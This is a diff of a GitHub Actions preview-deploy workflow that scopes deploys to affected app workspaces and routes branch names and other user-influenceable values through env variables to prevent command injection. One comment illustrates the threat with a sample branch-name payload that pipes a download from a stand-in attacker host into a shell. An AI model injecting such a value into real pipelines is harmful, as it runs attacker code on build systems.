@@ -72,75 +72,91 @@ jobs:
         with:
           install-cli: 'true'
 
-      # Detect whether the PR has any deploy-worthy changes. `code` is
-      # true when any TS/JS source / tsconfig / lockfile changed; `shared`
-      # is true when build-graph infra (turbo.json, root package.json)
-      # changed. ORing them gives us "deploy needed" — consistent with
-      # how lint.yml, typecheck.yml, codeql.yml all gate. Docs-only PRs
-      # have both false and skip the substantive steps below.
-      #
-      # NOTE: do NOT gate on `outputs.docs` — dorny/paths-filter sets
-      # that to true if ANY file matches the docs pattern (e.g. a PR
-      # with both .ts + .md → `docs=true` AND `code=true`), so a
-      # "skip if docs" gate would block real code PRs that touch a
-      # README. Use the positive `code || shared` signal instead.
+      # Compute which app workspaces are affected by this PR via the
+      # composite's per-workspace outputs (from Turbo's --filter=...[base]
+      # dry-run). Only those apps get a preview deploy; the rest skip.
+      # This subsumes the previous `code || shared` gate because Turbo
+      # already treats turbo.json / root package.json changes as
+      # touching every workspace.
       - uses: ./.github/actions/changes
         id: changes
 
-      - name: No deploy-worthy changes — skipping
-        if: steps.changes.outputs.code != 'true' && steps.changes.outputs.shared != 'true'
-        run: echo "::notice::No code or shared-infra changes — skipping preview deploy. Teardown stays unconditional on close."
+      - name: Compute affected apps
+        id: apps
+        run: |
+          APPS=""
+          [ "${{ steps.changes.outputs.api }}"   = "true" ] && APPS="${APPS},api"
+          [ "${{ steps.changes.outputs.web }}"   = "true" ] && APPS="${APPS},web"
+          [ "${{ steps.changes.outputs.admin }}" = "true" ] && APPS="${APPS},admin"
+          APPS="${APPS#,}"
+          echo "list=${APPS}" >> "$GITHUB_OUTPUT"
+          if [ -z "$APPS" ]; then
+            echo "::notice::No app workspaces affected — skipping preview deploys. Teardown stays unconditional on close."
+          else
+            echo "::notice::Affected apps: ${APPS}"
+          fi
 
       # Stream the staging 1Password Environment into $GITHUB_ENV. Adding
       # a new secret means adding it to the Environment in the 1Password
       # UI — no workflow change required.
       - uses: ./.github/actions/op-env
-        if: steps.changes.outputs.code == 'true' || steps.changes.outputs.shared == 'true'
+        if: steps.apps.outputs.list != ''
         with:
           service-account-token: ${{ secrets.OP_SERVICE_ACCOUNT_TOKEN }}
 
       # Optional: spin up a per-PR Neon branch off main so migrations and
       # seed data are isolated. Requires RANDO_NEON_PROJECT_ID variable.
       # - name: Create Neon branch
-      #   if: vars.RANDO_NEON_PROJECT_ID != '' && (steps.changes.outputs.code == 'true' || steps.changes.outputs.shared == 'true')
+      #   if: vars.RANDO_NEON_PROJECT_ID != '' && steps.apps.outputs.list != ''
       #   run: rando db branch create ${{ vars.RANDO_NEON_PROJECT_ID }} pr-${{ github.event.pull_request.number }} --from main
 
       - name: Trigger preview deploys
-        if: steps.changes.outputs.code == 'true' || steps.changes.outputs.shared == 'true'
+        if: steps.apps.outputs.list != ''
         # github.head_ref is user-influenceable (git allows a wide
         # character set in branch names; a fork-PR head or a
         # collaborator could craft `'); curl evil.example | sh #` and
-        # break out of the single-quoted arg below). Plumb through
-        # env: so bash treats the value as data, never as script.
-        # Pattern matches the integration-tests.yml fix in #192.
+        # break out of the single-quoted arg). Plumb through env: so
+        # bash treats the value as data, never as script. APPS comes
+        # from our own composite output (steps.apps.outputs.list) —
+        # not user-influenceable — but env-ified for the same audit
+        # consistency as the rest of the workflow (#192 pattern).
         env:
           BRANCH: ${{ github.head_ref }}
+          APPS: ${{ steps.apps.outputs.list }}
           FORCE_COLOR: '1'
-        run: rando deploy branch "$BRANCH" --stable-url
+        run: rando deploy branch "$BRANCH" --stable-url --apps "$APPS"
 
       # Issue tracker: each ticket referenced by this PR → In Review,
-      # plus a comment with the per-app stable deploy URLs. Soft-fails
-      # so a tracker hiccup doesn't fail the deploy job.
+      # plus a comment with the per-app stable deploy URLs (only the
+      # apps that actually deployed — empty bullet list would mislead).
+      # Soft-fails so a tracker hiccup doesn't fail the deploy job.
       - id: refs
-        if: vars.TRACKER_ENABLED != 'false' && (steps.changes.outputs.code == 'true' || steps.changes.outputs.shared == 'true')
+        if: vars.TRACKER_ENABLED != 'false' && steps.apps.outputs.list != ''
         uses: ./.github/actions/issue-refs
 
       - name: Sync issues → In Review with deploy URLs
-        if: vars.TRACKER_ENABLED != 'false' && (steps.changes.outputs.code == 'true' || steps.changes.outputs.shared == 'true') && steps.refs.outputs.keys != ''
+        if: vars.TRACKER_ENABLED != 'false' && steps.apps.outputs.list != '' && steps.refs.outputs.keys != ''
         # Every user-influenceable value used in shell is plumbed via
         # env: blocks (CWE-77 prevention). github.head_ref + pr.html_url
         # + the issue-keys output (whose source is PR title/body
         # parsing — user-controlled) all go through env vars, not
-        # template interpolation. Pattern from #192.
+        # template interpolation. APPS is our own composite output;
+        # env-ified for consistency. Pattern from #192.
         env:
           GITHUB_TOKEN: ${{ secrets.GITHUB_TOKEN }}
           FORCE_COLOR: '1'
           BRANCH: ${{ github.head_ref }}
           PR_URL: ${{ github.event.pull_request.html_url }}
+          APPS: ${{ steps.apps.outputs.list }}
           KEYS: ${{ steps.refs.outputs.keys }}
         run: |
-          MSG=$(printf 'Branch deploy live:\n\n- https://%s-api.rando-id.dev\n- https://%s-web.rando-id.dev\n- https://%s-admin.rando-id.dev\n\nPR: %s' \
-            "$BRANCH" "$BRANCH" "$BRANCH" "$PR_URL")
+          # Build a bullet list of stable URLs for each deployed app.
+          URL_LINES=""
+          IFS=',' read -ra APP_ARR <<< "$APPS"
+          for app in "${APP_ARR[@]}"; do
+            URL_LINES="${URL_LINES}- https://${BRANCH}-${app}.rando-id.dev"$'\n'
+          done
+          MSG=$(printf 'Branch deploy live:\n\n%s\nPR: %s' "$URL_LINES" "$PR_URL")
           printf '%s\n' "$KEYS" | while IFS= read -r key; do
             [ -z "$key" ] && continue
             echo "→ $key in-review + comment"
